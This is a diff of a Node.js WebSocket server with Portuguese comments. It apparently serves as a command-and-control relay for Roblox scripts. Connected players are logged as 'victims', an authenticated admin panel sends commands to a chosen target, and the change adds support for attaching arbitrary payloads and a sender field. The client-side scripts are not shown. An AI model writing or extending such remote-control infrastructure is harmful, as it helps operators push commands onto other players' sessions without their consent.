@@ -3,14 +3,15 @@ const WebSocket = require('ws');
 const PORT = process.env.PORT || 8080;
 const wss = new WebSocket.Server({ port: PORT });
 
+// A mesma senha secreta que está nos seus scripts do Roblox
 const CHAVE_SECRETA = "BatataFritaComQueijo123";
 
-let clientesConectados = new Map(); // Guarda socket -> nome do jogador (vítima)
-let painelAdmin = null; // Guarda a conexão do seu painel de controle
+let clientesConectados = new Map(); // Guarda socket -> nome do jogador (vítimas + admin)
+let painelAdmin = null; // Guarda a conexão do painel de controle
 
 console.log(`[SERVIDOR] WebSocket rodando com sucesso na porta ${PORT}...`);
 
-// Função auxiliar para mandar a lista atualizada para o admin
+// Função auxiliar para mandar a lista atualizada de quem está conectado para o admin
 function atualizarListaAdmin() {
     if (painelAdmin && painelAdmin.readyState === WebSocket.OPEN) {
         painelAdmin.send(JSON.stringify({
@@ -32,7 +33,7 @@ wss.on('connection', (ws) => {
             return;
         }
 
-        // 1. Autenticação das Vítimas
+        // 1. Autenticação das Vítimas normais
         if (data.tipo === 'auth') {
             if (data.chave !== CHAVE_SECRETA) {
                 console.log('[AUTENTICAÇÃO FALHOU] Chave secreta incorreta de um cliente.');
@@ -42,10 +43,10 @@ wss.on('connection', (ws) => {
             clientesConectados.set(data.jogador, ws);
             ws.nomeJogador = data.jogador;
             console.log(`[VÍTIMA CONECTADA]: ${data.jogador}`);
-            atualizarListaAdmin(); // Atualiza a lista no painel
+            atualizarListaAdmin();
         }
 
-        // 2. Autenticação do Painel Admin
+        // 2. Autenticação do Painel Admin (Agora também entra na lista de clientes se mandar o nome!)
         if (data.tipo === 'auth_admin') {
             if (data.chave !== CHAVE_SECRETA) {
                 console.log('[AUTENTICAÇÃO FALHOU] Tentativa inválida de login no Admin.');
@@ -53,17 +54,26 @@ wss.on('connection', (ws) => {
                 return;
             }
             painelAdmin = ws;
-            console.log('[PAINEL ADMIN CONECTADO COM SUCESSO]');
-            atualizarListaAdmin(); // Manda a lista atual logo de cara
+            
+            // Registra o admin na lista de conectados para ele aparecer na própria GUI
+            if (data.jogador) {
+                clientesConectados.set(data.jogador, ws);
+                ws.nomeJogador = data.jogador;
+            }
+
+            console.log(`[PAINEL ADMIN CONECTADO]: ${data.jogador || "Admin"}`);
+            atualizarListaAdmin();
         }
 
-        // 3. O Painel Admin manda um comando para um alvo específico
+        // 3. O Painel Admin manda um comando para um alvo específico (com suporte a payload e remetente)
         if (data.tipo === 'comando' && ws === painelAdmin) {
             let alvoSocket = clientesConectados.get(data.alvo);
             
             if (alvoSocket && alvoSocket.readyState === WebSocket.OPEN) {
                 alvoSocket.send(JSON.stringify({
-                    comando: data.comando
+                    comando: data.comando,
+                    payload: data.payload || null,
+                    remetente: data.remetente || null
                 }));
                 console.log(`[COMANDO ENVIADO] Alvo: ${data.alvo} | Ação: ${data.comando}`);
             } else {
@@ -72,17 +82,21 @@ wss.on('connection', (ws) => {
         }
     });
 
+    // Evento quando alguém se desconecta
     ws.on('close', () => {
         if (ws === painelAdmin) {
             painelAdmin = null;
             console.log('[PAINEL ADMIN] Você se desconectou do servidor.');
-        } else if (ws.nomeJogador) {
+        } 
+        
+        if (ws.nomeJogador) {
             clientesConectados.delete(ws.nomeJogador);
-            console.log(`[VÍTIMA DESCONECTADA]: ${ws.nomeJogador}`);
+            console.log(`[CLIENTE DESCONECTADO]: ${ws.nomeJogador}`);
             atualizarListaAdmin(); // Atualiza a lista tirando quem saiu
         }
     });
 
+    // Lida com erros de conexão
     ws.on('error', (err) => {
         console.log('[ERRO NO SOCKET]:', err.message);
     });
